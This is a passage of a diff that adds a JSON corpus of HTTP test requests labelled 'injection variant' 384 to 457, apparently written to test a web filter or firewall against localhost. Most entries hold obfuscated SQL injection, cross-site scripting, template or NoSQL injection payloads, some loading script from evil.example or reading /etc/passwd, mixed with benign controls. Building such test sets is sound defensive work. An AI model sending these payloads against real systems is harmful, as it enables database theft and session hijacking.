+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "72"
+      ]
+    ],
+    "body": "comment=1%20AND%20BENCHMARK%26%23x28%3B1000000%26%2344MD5%281%29%29&ok=1"
+  },
+  {
+    "name": "injection variant 384 (arg name)",
+    "method": "GET",
+    "uri": "/item?%5C3c%20a%5C20%20h%5C72%20ef%3D%22javascrip%5C74%20%3Aco%5C6e%20f%5C69%20rm%5C28%201%29%22%5C3e%20x%3C%2Fa%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 385 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=document.write('<b>')"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 386 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "93"
+      ]
+    ],
+    "body": "comment=%3Cbody%20onload%20%3D%20eval%20%28atob%20%28%27YQ%20%3D%20%20%3D%20%27%29%29%3E&ok=1"
+  },
+  {
+    "name": "injection variant 387 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "129"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"1 UNION SELECT username, password FROM users\"}, \"tags\": [\"a\", \"1 UNION SELECT username, password FROM users\"]}"
+  },
+  {
+    "name": "injection variant 388 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3C%5C%5C36%20%5C34%20%20i%5C76%20%5C20%20s%5C7%5C34%20%20%5C79%20le%5C3d%20%5C22%20%5C7%5C37%20%20%5C69%20dt%5C68%20%3A%5C5c%20%5C36%205%20xpr%5C65%20%5C5c%2073%20si%5C6f%20%5C6e%20%28%5C61%20le%5C72%5C20%20t%281%5C2%5C39%20%5C20%20%5C5c%2029%20%22%5C%5C33%20e%20",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 389 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "53"
+      ]
+    ],
+    "body": "comment=sETT%5C151meOU%5C164%28a%5Cx6cert%2C1%29&ok=1"
+  },
+  {
+    "name": "injection variant 390 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3CIframE%20srC%3DjAVAScrIPt%3AAlERt%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 391 (arg name)",
+    "method": "GET",
+    "uri": "/item?1%27%20OR%20%271%27%20%3D%20%271=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 392 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=<a h\\72 \\65 f\\3d \"j\\61 vascript:\\63 o\\6e \\66 i\\72 m\\28 1)\">x</a>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 393 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3CA%09href%3D%22JaVascRipt%3AcONFIrm%281%29%22%3EX%3C%2Fa%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 394 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "{\"$Ne\": nUll}"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 395 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "87"
+      ]
+    ],
+    "body": "comment=%3Cdiv%20style%20%3D%20%22width%3Aexpression%20%28alert%20%281%29%29%22%3E&ok=1"
+  },
+  {
+    "name": "injection variant 396 (arg name)",
+    "method": "GET",
+    "uri": "/item?1%253B%2520WAItfOr%2520DeLaY%2520%25270%253A0%253A5%2527=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 397 (query)",
+    "method": "GET",
+    "uri": "/item?id=%253Cdiv%2520style%253D%2522width%253Aexpression%2528alert%25281%2529%2529%2522%253E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 398 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "61"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"admin%27--\"}, \"tags\": [\"a\", \"admin%27--\"]}"
+  },
+  {
+    "name": "injection variant 399 (arg name)",
+    "method": "GET",
+    "uri": "/item?%3Cinput%20%20onfocus%3Dalert%281%29%20%20autofocus%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 400 (query)",
+    "method": "GET",
+    "uri": "/item?id=price%3A%0A10-20",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 401 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "167"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"'||\\\\50se\\\\u004C\\\\U0045\\\\x43t 1 FroM\\\\U0020duA\\\\u006c\\\\u0029||'\"}, \"tags\": [\"a\", \"'||\\\\50se\\\\u004C\\\\U0045\\\\x43t 1 FroM\\\\U0020duA\\\\u006c\\\\u0029||'\"]}"
+  },
+  {
+    "name": "injection variant 402 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "155"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"'\\\\u007c|(S\\\\x45L\\\\u0045CT\\\\401 FROM du\\\\141l\\\\x29||\\\\x27\"}, \"tags\": [\"a\", \"'\\\\u007c|(S\\\\x45L\\\\u0045CT\\\\401 FROM du\\\\141l\\\\x29||\\\\x27\"]}"
+  },
+  {
+    "name": "injection variant 403 (query)",
+    "method": "GET",
+    "uri": "/item?id=SeleCT%2520loaD_FiLE%2528%2527%252FEtc%252FPAsswd%2527%2529",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 404 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "93"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"'||(SELECT 1 FROM dual)||'\"}, \"tags\": [\"a\", \"'||(SELECT 1 FROM dual)||'\"]}"
+  },
+  {
+    "name": "injection variant 405 (query)",
+    "method": "GET",
+    "uri": "/item?id=%26%2360%3Ba%26%2332href%26%2361%22javascript%26colon%3Bconfirm%20%281%26%2341%3B%22%26%23x3e%3Bx%26%2360%3B%2Fa%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 406 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "document&#46write&#x28;'<b>&#39&#41;"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 407 (query)",
+    "method": "GET",
+    "uri": "/item?id=1e1union%20select",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 408 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "38"
+      ]
+    ],
+    "body": "comment=seTTImEout%28alErt%2C1%29&ok=1"
+  },
+  {
+    "name": "injection variant 409 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "JAvASCRIpt:ALert(document.cOOkIE)"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 410 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "118"
+      ]
+    ],
+    "body": "comment=%26lt%3Binput%26%23x20%3Bonfocus%20%26%2361%3B%26%23x20%3Balert%20%281%29%26%23x20%3Bautofocus%26%2362%3B&ok=1"
+  },
+  {
+    "name": "injection variant 411 (path)",
+    "method": "GET",
+    "uri": "/page/%3C%21--%5BiF%20gtE%20IE%204%5D%3E%3CsCRiPt%3EALerT%281%29%3C%2FScrIPT%3E%3C%21%5BENDIf%5D--%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 412 (path)",
+    "method": "GET",
+    "uri": "/page/setTimeout%28alert%2C1%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 413 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "33"
+      ]
+    ],
+    "body": "comment=drop%20me%20a%20line&ok=1"
+  },
+  {
+    "name": "injection variant 414 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "69"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"iT'S 5 O'CloCK\"}, \"tags\": [\"a\", \"iT'S 5 O'CloCK\"]}"
+  },
+  {
+    "name": "injection variant 415 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=do\\63 um\\65 nt.wr\\69 te\\28 '<b>')"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 416 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "93"
+      ]
+    ],
+    "body": "comment=1%26%2337%3B20AND%2520BENCHMARK%25281000000%26%2337%3B2CMD5%25281%2529%26%233729&ok=1"
+  },
+  {
+    "name": "injection variant 417 (query)",
+    "method": "GET",
+    "uri": "/item?id=%26%23x3c%3BsCRipT%20SRC%26%2361%3B%2F%26%2347%3BEvil.EXAmPLE%2Fx.JS%26%2362%3B%26%23X3c%3B%26%23X2f%3BscRIpT%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 418 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "71"
+      ]
+    ],
+    "body": "comment=1%20UNION%20SELECT%20username%2C%20password%20FROM%20users&ok=1"
+  },
+  {
+    "name": "injection variant 419 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%3B%2F%2A%2A%2FDROP%2F%2A%2A%2FTABLE%2F%2A%2A%2Fusers--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 420 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Ca%20href%3D%22javascript%3Aconfirm%281%29%22%3Ex%3C%2Fa%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 421 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "38"
+      ]
+    ],
+    "body": "comment=script%20writing%20course&ok=1"
+  },
+  {
+    "name": "injection variant 422 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1 AND SLEEP(5)"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 423 (query)",
+    "method": "GET",
+    "uri": "/item?id=setTimeout%28alert%2C1%26%2341%3B",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 424 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=' OR 1 = 1#"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 425 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "235"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"&LT!&#x2d;-[if gte&#32IE 4]&#x3e;&LTscript&#62alert(1&#41&LT/script&#62&LT&#x21;[endif]&#45;-&#62\"}, \"tags\": [\"a\", \"&LT!&#x2d;-[if gte&#32IE 4]&#x3e;&LTscript&#62alert(1&#41&LT/script&#62&LT&#x21;[endif]&#45;-&#62\"]}"
+  },
+  {
+    "name": "injection variant 426 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cdiv%20style%3D%22width%3Aexpression%28alert%281%29%29%22%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 427 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "82"
+      ]
+    ],
+    "body": "comment=1%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--&ok=1"
+  },
+  {
+    "name": "injection variant 428 (arg name)",
+    "method": "GET",
+    "uri": "/item?%2527%253Balert%2528String.fromCharCode%252888%2529%2529%252F%252F=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 429 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "105"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"\\\"><script>fetch('//x')</script>\"}, \"tags\": [\"a\", \"\\\"><script>fetch('//x')</script>\"]}"
+  },
+  {
+    "name": "injection variant 430 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "';alert(String.fromCharCode(88))//"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 431 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1; WAITFOR DELAY '0:0:5'"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 432 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref={{CONStrUCTor.coNsTrUctOr ('aLerT (1)') ()}}"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 433 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "46"
+      ]
+    ],
+    "body": "comment=document.write%28%27%3Cb%3E%27%29&ok=1"
+  },
+  {
+    "name": "injection variant 434 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=&LTiframe&#32%3bsrc&#61%3bjavascript&#58alert&#x28%3b1&#x29%3b>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 435 (arg name)",
+    "method": "GET",
+    "uri": "/item?1%2B1%3D2=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 436 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "64"
+      ]
+    ],
+    "body": "comment=x%27%20AND%201%3DCONVERT%28int%2C%40%40version%29--&ok=1"
+  },
+  {
+    "name": "injection variant 437 (arg name)",
+    "method": "GET",
+    "uri": "/item?O%27Brien=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 438 (path)",
+    "method": "GET",
+    "uri": "/page/setTimeout%2528alert%252C1%2529",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 439 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "101"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"' UNION ALL SELECT NULL,NULL--\"}, \"tags\": [\"a\", \"' UNION ALL SELECT NULL,NULL--\"]}"
+  },
+  {
+    "name": "injection variant 440 (path)",
+    "method": "GET",
+    "uri": "/page/sEtTimEoUT%2528aLeRT%252C1%2529",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 441 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=<iframe src = javascript:alert (1)>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 442 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "2026-10-11"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 443 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=The union of two sets"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 444 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "173"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"&#60;script&#32src&#61;/&#x2f;evil.example/x&#46js&#62;&LT/script>\"}, \"tags\": [\"a\", \"&#60;script&#32src&#61;/&#x2f;evil.example/x&#46js&#62;&LT/script>\"]}"
+  },
+  {
+    "name": "injection variant 445 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "32"
+      ]
+    ],
+    "body": "comment=1e1union%2520select&ok=1"
+  },
+  {
+    "name": "injection variant 446 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "admin'--"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 447 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "<input onfocus=alert(1) autofocus>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 448 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=javascript:alert (document.cookie)"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 449 (query)",
+    "method": "GET",
+    "uri": "/item?id=%2526LTimg%2520src%2526%252361%253Bx%2526%252332onerror%2526%252361alert%2526%2523401%2526%252341%253E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 450 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=seleCT LOAD_FiLe('/etc/PAsSwD')"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 451 (query)",
+    "method": "GET",
+    "uri": "/item?id=document.write%28%26%2339%3B%3Cb%3E%26%2339%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 452 (query)",
+    "method": "GET",
+    "uri": "/item?id=kitap",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 453 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cscript%20src%20%3D%20%2F%2Fevil.example%2Fx.js%3E%3C%2Fscript%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 454 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "41"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"\"}, \"tags\": [\"a\", \"\"]}"
+  },
+  {
+    "name": "injection variant 455 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref='||(SELECT 1 FROM dual)||'"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 456 (arg name)",
+    "method": "GET",
+    "uri": "/item?a%20%3C%20b%20and%20b%20%3E%20c=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 457 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
